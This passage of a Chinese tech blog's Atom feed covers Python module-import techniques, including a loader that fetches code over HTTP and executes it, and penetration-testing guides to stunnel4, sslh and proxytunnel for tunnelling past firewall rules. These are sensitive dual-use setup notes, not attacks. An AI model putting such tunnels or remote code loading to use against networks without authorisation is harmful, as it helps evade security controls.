<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cat++</title>
  
  <subtitle>看见我的猫粮吗</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://c.cat.plus/"/>
  <updated>2020-05-14T15:12:54.169Z</updated>
  <id>http://c.cat.plus/</id>
  
  <author>
    <name>Cat</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python花式导包的几种方法</title>
    <link href="http://c.cat.plus/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>http://c.cat.plus/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</id>
    <published>2018-03-14T17:01:00.000Z</published>
    <updated>2020-05-14T15:12:54.169Z</updated>
    
    <content type="html"><![CDATA[<p>今天跟大家分享 8 种导入模块的方法。</p><p>直接 import<br>人尽皆知的方法，直接导入即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>与此类似的还有，不再细讲</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ...</span><br><span class="line"><span class="keyword">from</span> ... <span class="keyword">import</span> ... <span class="keyword">as</span> ...</span><br></pre></td></tr></table></figure><p>一般情况下，使用 import 语句导入模块已经够用的。</p><p>但是在一些特殊场景中，可能还需要其他的导入方式。</p><p>下面我会一一地给你介绍。</p><p>使用 <strong>import</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__import__ 函数可用于导入模块，<span class="keyword">import</span> 语句也会调用函数。其定义为：</span><br><span class="line"></span><br><span class="line">__import__(name[, globals[, locals[, fromlist[, level]]]])</span><br></pre></td></tr></table></figure><p>参数介绍：</p><p>name (required): 被加载 module 的名称</p><p>globals (optional): 包含全局变量的字典，该选项很少使用，采用默认值 global()</p><p>locals (optional): 包含局部变量的字典，内部标准实现未用到该变量，采用默认值 - local()</p><p>fromlist (Optional): 被导入的 submodule 名称</p><p>level (Optional): 导入路径选项，Python 2 中默认为 -1，表示同时支持 absolute import 和 relative import。Python 3 中默认为 0，表示仅支持 absolute import。如果大于 0，则表示相对导入的父目录的级数，即 1 类似于 ‘.’，2 类似于 ‘..’。</p><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy 的效果，只要修改左值即可</p><p>如下示例，等价于 import os as myos：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = __import__(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 importlib<br>importlib 是 Python 中的一个标准库，importlib 能提供的功能非常全面。</p><p>它的简单示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos=importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>如果要实现 import xx as yy效果，可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 imp<br>imp 模块提供了一些 import 语句内部实现的接口。例如模块查找（find_module）、模块加载（load_module）等等（模块的导入过程会包含模块查找、加载、缓存等步骤）。可以用该模块来简单实现内建的 <strong>import</strong> 函数功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file, pathname, desc = imp.find_module(<span class="string">'os'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos = imp.load_module(<span class="string">'sep'</span>, file, pathname, desc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos</span><br><span class="line">&lt;module <span class="string">'sep'</span> <span class="keyword">from</span> <span class="string">'/usr/lib64/python2.7/os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>myos.getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>从 python 3 开始，内建的 reload 函数被移到了 imp 模块中。而从 Python 3.4 开始，imp 模块被否决，不再建议使用，其包含的功能被移到了 importlib 模块下。即从 Python 3.4 开始，importlib 模块是之前 imp 模块和 importlib 模块的合集。</p><p>使用 execfile<br>在 Python 2 中有一个 execfile 函数，利用它可以用来执行一个文件。</p><p>语法如下：</p><p>execfile(filename[, globals[, locals]])</p><p>参数有这么几个：</p><p>filename：文件名。</p><p>globals：变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</p><p>locals：变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">"/usr/lib64/python2.7/os.py"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>使用 exec<br>execfile 只能在 Python2 中使用，Python 3.x 里已经删除了这个函数。</p><p>但是原理值得借鉴，你可以使用 open … read  读取文件内容，然后再用 exec 去执行模块。</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">"/usr/lib64/python2.7/os.py"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span>    exec(f.read())</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/home/wangbm'</span></span><br></pre></td></tr></table></figure><p>import_from_github_com<br>有一个包叫做 import_from_github_com，从名字上很容易得知，它是一个可以从 github 下载安装并导入的包。为了使用它，你需要做的就是按照如下命令使用pip 先安装它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install import_from_github_com</span><br></pre></td></tr></table></figure><p>这个包使用了PEP 302中新的引入钩子，允许你可以从github上引入包。这个包实际做的就是安装这个包并将它添加到本地。你需要 Python 3.2 或者更高的版本，并且 git 和 pip 都已经安装才能使用这个包。</p><p>pip 要保证是较新版本，如果不是请执行如下命令进行升级。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>确保环境 ok 后，你就可以在 Python shell 中使用 import_from_github_com</p><p>示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> github_com.zzzeek <span class="keyword">import</span> sqlalchemy</span><br><span class="line">Collecting git+https://github.com/zzzeek/sqlalchemy</span><br><span class="line">Cloning https://github.com/zzzeek/sqlalchemy to /tmp/pip-acfv7t06-build</span><br><span class="line">Installing collected packages: SQLAlchemy</span><br><span class="line">Running setup.py install <span class="keyword">for</span> SQLAlchemy ... done</span><br><span class="line">Successfully installed SQLAlchemy<span class="number">-1.1</span><span class="number">.0</span>b1.dev0</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>locals()</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__spec__'</span>: <span class="literal">None</span>,</span><br><span class="line"><span class="string">'__package__'</span>: <span class="literal">None</span>, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>,</span><br><span class="line"><span class="string">'sqlalchemy'</span>: &lt;module <span class="string">'sqlalchemy'</span> <span class="keyword">from</span> <span class="string">'/usr/local/lib/python3.5/site-packages/\</span></span><br><span class="line"><span class="string">sqlalchemy/__init__.py'</span>&gt;,</span><br><span class="line"><span class="string">'__loader__'</span>: &lt;<span class="class"><span class="keyword">class</span> '<span class="title">_frozen_importlib</span>.<span class="title">BuiltinImporter</span>'&gt;&#125;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>看了 import_from_github_com的源码后，你会注意到它并没有使用importlib。实际上，它的原理就是使用 pip 来安装那些没有安装的包，然后使用Python的<strong>import</strong>()函数来引入新安装的模块。</p><p>远程导入模块<br>我在这篇文章里（深入探讨 Python 的 import 机制：实现远程导入模块），深入剖析了导入模块的内部原理，并在最后手动实现了从远程服务器上读取模块内容，并在本地成功将模块导入的导入器。</p><p>具体内容非常的多，你可以点击这个链接进行深入学习。</p><p>示例代码如下：</p><h1 id="新建一个-py-文件（my-importer-py），内容如下"><a href="#新建一个-py-文件（my-importer-py），内容如下" class="headerlink" title="新建一个 py 文件（my_importer.py），内容如下"></a>新建一个 py 文件（my_importer.py），内容如下</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> urllib2</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaFinder</span><span class="params">(importlib.abc.MetaPathFinder)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self._baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_module</span><span class="params">(self, fullname, path=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            baseurl = self._baseurl</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 不是原定义的url就直接返回不存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> path.startswith(self._baseurl):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            baseurl = path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            loader = UrlMetaLoader(baseurl)</span><br><span class="line">            <span class="keyword">return</span> loader</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlMetaLoader</span><span class="params">(importlib.abc.SourceLoader)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, baseurl)</span>:</span></span><br><span class="line">        self.baseurl = baseurl</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        f = urllib2.urlopen(self.get_filename(fullname))</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_filename</span><span class="params">(self, fullname)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.baseurl + fullname + <span class="string">'.py'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">install_meta</span><span class="params">(address)</span>:</span></span><br><span class="line">    finder = UrlMetaFinder(address)</span><br><span class="line">    sys.meta_path.append(finder)</span><br></pre></td></tr></table></figure><p>并且在远程服务器上开启 http 服务（为了方便，我仅在本地进行演示），并且手动编辑一个名为 my_info 的 python 文件，如果后面导入成功会打印 ok。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir httpserver &amp;&amp; cd httpserver</span><br><span class="line">$ cat&gt;my_info.py&lt;EOF</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">EOF</span><br><span class="line">$ cat my_info.py</span><br><span class="line">name=<span class="string">'wangbm'</span></span><br><span class="line">print(<span class="string">'ok'</span>)</span><br><span class="line">$</span><br><span class="line">$ python3 -m http.server <span class="number">12800</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">12800</span> (http://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">12800</span>/) ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>一切准备好，验证开始。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> my_importer <span class="keyword">import</span> install_meta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>install_meta(<span class="string">'http://localhost:12800/'</span>) <span class="comment"># 往 sys.meta_path 注册 finder</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> my_info  <span class="comment"># 打印ok，说明导入成功</span></span><br><span class="line">ok</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_info.name  <span class="comment"># 验证可以取得到变量</span></span><br><span class="line"><span class="string">'wangbm'</span></span><br></pre></td></tr></table></figure><p>好了，8 种方法都给大家介绍完毕，对于普通开发者来说，其实只要掌握 import 这种方法足够了，而对于那些想要自己开发框架的人来说，深入学习 <strong>import</strong> 以及 importlib 是非常有必要的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天跟大家分享 8 种导入模块的方法。&lt;/p&gt;
&lt;p&gt;直接 import&lt;br&gt;人尽皆知的方法，直接导入即可&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
    
      <category term="python" scheme="http://c.cat.plus/categories/python/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>stunnel4基于SSL加密的隧道工具</title>
    <link href="http://c.cat.plus/2015/07/11/Traffic_manipulation/stunnel4%E5%9F%BA%E4%BA%8ESSL%E5%8A%A0%E5%AF%86%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/"/>
    <id>http://c.cat.plus/2015/07/11/Traffic_manipulation/stunnel4%E5%9F%BA%E4%BA%8ESSL%E5%8A%A0%E5%AF%86%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7/</id>
    <published>2015-07-11T11:51:03.000Z</published>
    <updated>2020-06-05T07:20:59.006Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="stunnel4"><a href="#stunnel4" class="headerlink" title="stunnel4"></a><strong>stunnel4</strong></h3></blockquote><ul><li>无需修改源代码的情况下将TCP流量封装于SSL通道内</li><li>适用于本身不支持加密传输的应用</li><li>支持openssl安全特性</li><li>跨平台</li><li>性能优,多并发</li></ul><h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a><strong>环境部署</strong></h4><h5 id="安装内网stunnel4服务器"><a href="#安装内网stunnel4服务器" class="headerlink" title="安装内网stunnel4服务器"></a><strong>安装内网stunnel4服务器</strong></h5><ul><li><p>服务器端配置</p></li><li><p>Linux生成根证书:</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new –days 365 -nodes -x509 -out &#x2F;etc&#x2F;stunnel&#x2F; stunnel.pem -keyout &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem</span><br></pre></td></tr></table></figure><ul><li>创建配置文件:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;stunnel&#x2F;stunnel.conf</span><br><span class="line">cert &#x3D; &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem</span><br><span class="line">setuid &#x3D; stunnel4</span><br><span class="line">setgid &#x3D; stunnel4</span><br><span class="line">pid &#x3D; &#x2F;var&#x2F;run&#x2F;stunnel4&#x2F;stunnel4.pid</span><br><span class="line">[mysqls]</span><br><span class="line">accept  &#x3D; 0.0.0.0:443</span><br><span class="line">connect &#x3D; 1.1.1.11:3306</span><br></pre></td></tr></table></figure><p><strong>stunnel4自动启动</strong></p><pre><code>/etc/default/stunnel4    ENABLED=1</code></pre><p><strong>启动stunnel4服务</strong></p><pre><code>service stunnel4 start</code></pre><p><strong>防火墙规则</strong></p><ul><li>端口映射TCP/443端口到stunnel4服务端TCP/443</li><li>设置防火墙规则</li></ul><h5 id="Stunnel4客户端"><a href="#Stunnel4客户端" class="headerlink" title="Stunnel4客户端"></a><strong>Stunnel4客户端</strong></h5><p><strong>安装stunnel4客户端</strong></p><ul><li>kaLi自带</li></ul><p><strong>客户端配置</strong></p><pre><code>创建配置文件    vi /etc/stunnel/stunnel.conf    client = yes    [mysqls]    accept = 3306    connect = 192.168.1.11:443</code></pre><p><strong>客户端自动启动</strong></p><pre><code>/etc/default/stunnel4    ENABLED=1</code></pre><p><strong>启动客户端服务</strong></p><pre><code>service stunnel4 stop /start</code></pre><p><strong>Mysql客户端连接服务器</strong></p><pre><code>mysql -u root -h 127.0.0.1</code></pre><ul><li>抓包对比隧道前后差异</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;stunnel4&quot;&gt;&lt;a href=&quot;#stunnel4&quot; class=&quot;headerlink&quot; title=&quot;stunnel4&quot;&gt;&lt;/a&gt;&lt;strong&gt;stunnel4&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;ul&gt;

      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="stunnel4" scheme="http://c.cat.plus/tags/stunnel4/"/>
    
      <category term="kaLi" scheme="http://c.cat.plus/tags/kaLi/"/>
    
      <category term="openssl" scheme="http://c.cat.plus/tags/openssl/"/>
    
  </entry>
  
  <entry>
    <title>sslh端口转发分配器</title>
    <link href="http://c.cat.plus/2015/07/11/Traffic_manipulation/sslh%E7%AB%AF%E5%8F%A3%E5%88%86%E9%85%8D%E5%99%A8/"/>
    <id>http://c.cat.plus/2015/07/11/Traffic_manipulation/sslh%E7%AB%AF%E5%8F%A3%E5%88%86%E9%85%8D%E5%99%A8/</id>
    <published>2015-07-10T21:51:03.000Z</published>
    <updated>2020-06-05T07:08:46.246Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="sslh"><a href="#sslh" class="headerlink" title="sslh"></a><strong>sslh</strong></h3></blockquote><h4 id="端口分配器"><a href="#端口分配器" class="headerlink" title="端口分配器"></a><strong>端口分配器</strong></h4><ul><li>根据客户端第一个包检测协议类型</li><li>根据协议检测结果将流量转发给不同目标</li><li>支持HTTP,HTTPS,SSH,OpenVPN,tinc,XMPP和其它可基于正则表达式判断的人和协议类型</li><li>适用于防火墙允许443端口 <strong>入站</strong> 访问流量的环境</li></ul><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a><strong>配置文件</strong></h5><pre><code>vi /etc/default/sslh    RUN=yes    DAEMON_OPTS=&quot;--user sslh --listen 1.1.1.10:443 --ssh 127.0.0.1:22 --ssl 1.1.1.11:443 --http 127.0.0.1:80 --pidfile /var/run/sslh/sslh.pid&quot;</code></pre><h5 id="安装HTTPS站点"><a href="#安装HTTPS站点" class="headerlink" title="安装HTTPS站点"></a><strong>安装HTTPS站点</strong></h5><ul><li>安装IIS服务,证书服务</li><li>部署HTTPS站点</li></ul><h5 id="启动本地HTTP服务"><a href="#启动本地HTTP服务" class="headerlink" title="启动本地HTTP服务"></a><strong>启动本地HTTP服务</strong></h5><h5 id="防火墙端口映射TCP-443"><a href="#防火墙端口映射TCP-443" class="headerlink" title="防火墙端口映射TCP/443"></a><strong>防火墙端口映射TCP/443</strong></h5><h5 id="nmap扫描服务识别"><a href="#nmap扫描服务识别" class="headerlink" title="nmap扫描服务识别"></a><strong>nmap扫描服务识别</strong></h5><pre><code>nmap -p443 -sV -A 192.168.1.11</code></pre><p><em>扫描结果验证:443端口识别为多个服务</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;sslh&quot;&gt;&lt;a href=&quot;#sslh&quot; class=&quot;headerlink&quot; title=&quot;sslh&quot;&gt;&lt;/a&gt;&lt;strong&gt;sslh&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;端口分配器&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
      <category term="sslh" scheme="http://c.cat.plus/tags/sslh/"/>
    
      <category term="nmap" scheme="http://c.cat.plus/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>HTTP代理隧道工具-proxytunnel</title>
    <link href="http://c.cat.plus/2015/07/09/Traffic_manipulation/HTTP%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7-proxytunnel/"/>
    <id>http://c.cat.plus/2015/07/09/Traffic_manipulation/HTTP%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7-proxytunnel/</id>
    <published>2015-07-09T10:31:02.000Z</published>
    <updated>2020-06-05T07:17:28.578Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="proxytunnel"><a href="#proxytunnel" class="headerlink" title="proxytunnel"></a><strong>proxytunnel</strong></h3></blockquote><ul><li>通过标准的HTTP/HTTPS代理创建隧道的工具</li><li>通过HTTP Connect 方法封装信息</li><li>适用于内网使用代理并且防火墙只允许代理服务器上网的场景</li><li>无法创建DNS隧道和ICMP隧道</li></ul><h4 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a><strong>Lab1</strong></h4><h5 id="将外网资源映射为内网指定端口"><a href="#将外网资源映射为内网指定端口" class="headerlink" title="将外网资源映射为内网指定端口"></a><strong>将外网资源映射为内网指定端口</strong></h5><ul><li>内网安装squid3代理,proxytunnel<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;squid3&#x2F;squid.conf</span><br><span class="line">&#x2F;^http_port</span><br><span class="line">&#x2F;^http_access#改allow</span><br><span class="line">&#x2F;^acl</span><br></pre></td></tr></table></figure></li></ul><p>创建隧道:</p><pre><code>proxytunnel -a 80 -p 127.0.0.1:3128 -d 192.168.1.1:80</code></pre><h4 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a><strong>Lab2</strong></h4><h5 id="外网资源非防火墙允许端口"><a href="#外网资源非防火墙允许端口" class="headerlink" title="外网资源非防火墙允许端口"></a><strong>外网资源非防火墙允许端口</strong></h5><ul><li>修改目标资源侦听端口可能无法躲避防火墙深层检测</li><li>外网安装squid3代理服务器并侦听80端口</li><li>创建隧道:<pre><code>proxytunnle -a 80 -p 127.0.0.1:3128 -r 192.168.1.1:80 -d 192.168.1.1:22</code></pre></li></ul><h4 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a><strong>Lab3</strong></h4><h5 id="ssh客户端配置自动创建代理链隧道"><a href="#ssh客户端配置自动创建代理链隧道" class="headerlink" title="ssh客户端配置自动创建代理链隧道"></a><strong>ssh客户端配置自动创建代理链隧道</strong></h5><pre><code>vi ~/.ssh/configHost 192.168.1.1    Hostname 192.168.1.1    ProtocolKeepAlives 30    ProxyCommand /usr/bin/proxytunnel -p 1.1.1.1:3128 -r 192.168.1.1:80 -d %h:%p</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;proxytunnel&quot;&gt;&lt;a href=&quot;#proxytunnel&quot; class=&quot;headerlink&quot; title=&quot;proxytunnel&quot;&gt;&lt;/a&gt;&lt;strong&gt;proxytunnel&lt;/strong&gt;&lt;/h3&gt;&lt;/block
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="proxytunnel" scheme="http://c.cat.plus/tags/proxytunnel/"/>
    
      <category term="HTTP隧道" scheme="http://c.cat.plus/tags/HTTP%E9%9A%A7%E9%81%93/"/>
    
